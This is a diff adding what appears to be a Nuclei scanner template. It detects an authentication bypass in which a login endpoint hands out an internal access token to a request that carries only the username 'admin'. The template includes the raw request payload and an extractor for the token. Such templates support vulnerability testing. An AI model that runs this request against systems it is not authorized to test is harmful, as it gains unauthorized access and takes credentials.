@@ -1,0 +1,37 @@
+id: ch1-auth-bypass
+
+info:
+  name: Authentication Bypass - Missing Password Validation
+  author: security-researcher
+  severity: critical
+  description: |
+    The login endpoint accepts requests with only a username field (no password),
+    resulting in an authentication bypass that grants internal access token.
+  tags: auth,bypass,misconfiguration
+
+http:
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username": "admin"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "internal-access"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: json
+        part: body
+        name: token
+        json:
+          - '.token'
